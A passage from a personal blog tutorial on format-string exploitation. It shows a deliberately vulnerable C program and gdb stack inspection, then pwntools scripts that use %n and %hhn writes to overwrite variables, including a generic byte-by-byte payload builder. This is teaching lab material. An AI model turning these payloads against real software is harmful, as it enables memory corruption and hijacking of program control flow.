class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="built_in">printf</span>(s);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;----------------&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="number">16</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 2&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile it (32-bit makes it easier to analyze, because 64-bit program saves first 6 args in registers on Linux).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -o overwrite overwrite.c -no-pie</span><br></pre></td></tr></table></figure>
<h4 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h4><p>The first aim is to reach <code>Path 1</code>. As <code>ASLR</code> is enabled, address of variable on stack like <code>c</code> changes each turn, so here I give address of <code>c</code> intentionally.</p>
<p>Since we need to write <code>16</code> to <code>c</code>, it requires address of <code>c</code> that we already got, and the order of our input. The exploit will be built like: <code>[addr][padding]%order$n</code>.</p>
<p>Determine the <code>order</code>.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gdb ./overwrite -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./overwrite...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./overwrite)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x1030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/overwrite</span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0xffffd41c</span><br><span class="line">input:</span><br><span class="line">%p%p%p%p%p%p</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">──────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x56556227  →  &lt;main+110&gt; add esp, 0x10      ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x56555000  →  0x464c457f</span><br><span class="line">0xffffd3ac│+0x0010: 0x565561d0  →  &lt;main+23&gt; add ebx, 0x2e30</span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000</span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">...</span><br><span class="line">─────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>our input <code>%p%p%p%p%p%p</code> is the 6th parameter of format string (7th parameter of func <code>printf</code>), so <code>order</code> should be <code>6</code>. The addr will be in received contents, so the exploit script goes like:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">recv1 = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> recv1</span><br><span class="line">c_addr = <span class="built_in">int</span>(recv1, <span class="number">16</span>)</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;%012d&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Finally reach the <code>Path 1</code>. </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python path1.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 660</span><br><span class="line">0xffda4b2c</span><br><span class="line">,K%012d%6<span class="variable">$n</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 660)</span><br><span class="line">,K-00002471224----------------</span><br><span class="line">Path 1</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>Here we use <code>%012d</code> instead of concrete 12 letters, to show more possibilities. When running, <code>%012d</code> will be replaced by 12 integers and   </p>
<h4 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h4><p>Though the <code>[addr][padding]%order$s</code> is enough for <code>Path 1</code>, what about <code>Path 2</code> and <code>Path 3</code>?</p>
<p>For <code>Path 2</code> we have to set variable <code>a</code> to be <code>2</code>. If we still using format <code>[addr][padding]%order$s</code>, even if <code>[addr]</code> part is beyond 4 characters.</p>
<p>Actually it is flexible. Put <code>[addr]</code> back to build <code>aa%order$n[padding][addr]</code>, then determine <code>order</code>, <code>[padding]</code> and <code>[addr]</code>.</p>
<p>First check the stack</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./overwrite -q</span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0xffffd41c</span><br><span class="line">input:</span><br><span class="line">abcdefghqwerasdf</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">──────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x56556227  →  &lt;main+110&gt; add esp, 0x10      ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x56555000  →  0x464c457f</span><br><span class="line">0xffffd3ac│+0x0010: 0x565561d0  →  &lt;main+23&gt; add ebx, 0x2e30</span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000</span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">───────────────────────────</span><br><span class="line">gef➤  x/x 0xffffd3b8</span><br><span class="line">0xffffd3b8:     0x64636261      <span class="comment"># `abcd` in little-endian</span></span><br><span class="line">gef➤  x/x 0xffffd3bc</span><br><span class="line">0xffffd3bc:     0x68676665      <span class="comment"># `efgh` </span></span><br><span class="line">gef➤  x/x 0xffffd3c0</span><br><span class="line">0xffffd3c0:     0x72657771      <span class="comment"># `qwer`</span></span><br><span class="line">gef➤  x/x 0xffffd3c4</span><br><span class="line">0xffffd3c4:     0x66647361      <span class="comment"># `asdf`</span></span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>The <code>aa%order</code> occupies 6th parameter (item), the <code>$n[padding]</code> should form 7th parameter so that leave <code>[addr]</code> to be 8th parameter too.<br>Therefore <code>order</code> is <code>8</code> and <code>[padding]</code> should be 2 chars.<br><img   src="/imghost/fsvi/a.png"  alt="variable a addr"><br>As <code>a</code> is a global variable in <code>.data</code> section, and we use <code>-no-pie</code> to make base address static, so its address <code>0x00004024</code> is changeless. So final exploit should be: <code>aa%8$nxx</code> plus <code>0x00004024</code>. Still need <code>pwntools</code>:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804C024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$nxx&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Finally reach the <code>Path 2</code>.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python path2.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 411</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 411)</span><br><span class="line">0xffea723c</span><br><span class="line">input:</span><br><span class="line">aaaa$----------------</span><br><span class="line">Path 2</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>The last challenge is <code>Path 3</code> with a huge number to meet. If we also use padding, pretty much padding it is an unlikely successful exploit.<br>Here introduces <code>hh</code> and <code>h</code>, so what is the point of the h and hh modifiers for printf format specifiers?</p>
<p><code>h</code>:    it stands for a half.</p>
<ul>
<li>Speciﬁes that a following d, i, o, u, x, or X conversion speciﬁer applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); or that a following n conversion speciﬁer applies to a pointer to a short int argument.</li>
</ul>
<p><code>hh</code>:   it stands for, as a historical guess, for half of a half.</p>
<ul>
<li>Change <code>short</code> in <code>h</code> explanation to <code>char</code>.</li>
</ul>
<p>After combining with <code>%n</code>, use <code>%hhn</code> to output a char size (1 bytes), use <code>%hn</code> to output a short size (2 bytes). <code>Path 3</code> needs <code>b</code> to be <code>0xdeadbeef</code>, so we can fill the bytes one by one to form a coherent <code>0xdeadbeef</code>.<br><img   src="/imghost/fsvi/a.png"  alt="variable a addr"><br>First get <code>b</code> address: <code>0x0804C028</code>. Then we cover memory as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address     hex      decimal</span><br><span class="line">0x0804C028  \xef     # 239</span><br><span class="line">0x0804C029  \xbe     # 190</span><br><span class="line">0x0804C02a  \xad     # 173</span><br><span class="line">0x0804C02b  \xde     # 222</span><br></pre></td></tr></table></figure>
<p>we still remember that the <code>order</code> is <code>6</code>. Build the payload now:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># since \xad &lt; \xbe &lt; \xde &lt; \xef</span></span><br><span class="line"><span class="comment"># so overwrite order is unique, from smaller to the larger</span></span><br><span class="line">p32(<span class="number">0x0804C02a</span>)+p32(<span class="number">0x0804C029</span>)+p32(<span class="number">0x0804C02b</span>)+p32(<span class="number">0x0804C028</span>)+<span class="string">&#x27;%157c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%32c&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br></pre></td></tr></table></figure>
<p>This is my solution, while I find another clever choice, which gives a method for all this kind of problems (similar to <code>fmtstr_payload</code> in <code>pwntools</code>): </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804C028</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># `6` represents `order`</span></span><br><span class="line"><span class="comment"># `4` represents `32-bit`</span></span><br><span class="line"><span class="comment"># `0x0804C028` indicates start address</span></span><br><span class="line"><span class="comment"># `0xdeadbeef` indicates what to write</span></span><br></pre></td></tr></table></figure>
<p>Here comes the script to reach <code>Path 3</code>:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">...</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804C028</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">payload = p32(<span class="number">0x0804C02a</span>)+p32(<span class="number">0x0804C029</span>)+p32(<span class="number">0x0804C02b</span>)+p32(<span class="number">0x0804C028</span>)+<span class="string">&#x27;%157c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%32c&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>And the result:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python path3.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 1327</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 1327)</span><br><span class="line">0xff92fc2c</span><br><span class="line">input:</span><br><span class="line">*)+(                                                                                                                                                                            @                               \x99                \x00---------------</span><br><span class="line">Path 3</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
                </div>
                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn/">pwn</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/format-string/">format-string</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2020/07/16/2020-07-16-Integer-Overflow-Intro/"
                                   title="Integer Overflow Intro"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Integer Overflow Intro</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2020/05/29/2020-05-29-Some-Network-File-Sharing-Services/"
                                   title="Some Network File Sharing Services"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Some Network File Sharing Services</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-String-Introduction"><span class="nav-number">1.</span> <span class="nav-text">Format String Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-Principle"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability Principle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-String-Exploit"><span class="nav-number">3.</span> <span class="nav-text">Format String Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crash-program"><span class="nav-number">3.1.</span> <span class="nav-text">Crash program</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-Memory"><span class="nav-number">3.2.</span> <span class="nav-text">Leak Memory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Leak-Stack"><span class="nav-number">3.2.1.</span> <span class="nav-text">Leak Stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Leak-Any"><span class="nav-number">3.2.2.</span> <span class="nav-text">Leak Any</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overwrite-Memory"><span class="nav-number">3.3.</span> <span class="nav-text">Overwrite Memory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Basic"><span class="nav-number">3.3.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Advanced"><span class="nav-number">3.3.2.</span> <span class="nav-text">Advanced</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2025
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
                
            </div>

            <div class="theme-info info-item default">
                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
            </div>

            

            
        

        <div class="count-item info-item default">
            
                <span class="count-box border-box word">
                    <span class="item-type border-box">Total words</span>
                    <span class="item-value border-box word">137k</span>
                </span>
            

            

            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            $li-margin-bottom = 0.8rem
$post-tool-button-width = 2.5rem

.post-tools-container {
  padding-top var(--component-gap)

  .tools-list {

    li {
      position relative
      box-sizing border-box
      width $post-tool-button-width
      height $post-tool-button-width
      margin-bottom $li-margin-bottom
      color var(--text-color-3)
      font-size 1.2rem
      background var(--background-color-1)
      border-radius 50%
      box-shadow 2px 2px 5px var(--shadow-color)
      cursor pointer

      &:hover {
        box-shadow 2px 2px 8px var(--shadow-hover-color)
      }

      i {
        color var(--text-color-3)
      }


      &:hover {
        color var(--background-color-1)
        background var(--primary-color)

        i {
          color var(--background-color-1)
        }
      }


      &:last-child {
        margin-bottom 0
      }


      &.toggle-show-toc {
        display none
      }


      &.go-to-comments {
        .post-comments-count {
          position absolute
          top 0
          right -1rem
          display none
          align-items center
          justify-content center
          box-sizing border-box
          min-width 1.1rem
          height 1.1rem
          padding 0 0.2rem
          color var(--badge-color)
          font-size 12px
          background var(--badge-background-color)
          border-radius 0.4rem

          +keep-tablet() {
            display none !important
          }
        }
      }
    }
  }
}

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-toggle-theme-mode flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-String-Introduction"><span class="nav-number">1.</span> <span class="nav-text">Format String Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerability-Principle"><span class="nav-number">2.</span> <span class="nav-text">Vulnerability Principle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Format-String-Exploit"><span class="nav-number">3.</span> <span class="nav-text">Format String Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crash-program"><span class="nav-number">3.1.</span> <span class="nav-text">Crash program</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-Memory"><span class="nav-number">3.2.</span> <span class="nav-text">Leak Memory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Leak-Stack"><span class="nav-number">3.2.1.</span> <span class="nav-text">Leak Stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Leak-Any"><span class="nav-number">3.2.2.</span> <span class="nav-text">Leak Any</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overwrite-Memory"><span class="nav-number">3.3.</span> <span class="nav-text">Overwrite Memory</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Basic"><span class="nav-number">3.3.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Advanced"><span class="nav-number">3.3.2.</span> <span class="nav-text">Advanced</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<!-- common -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local-search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->


<div class="">
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

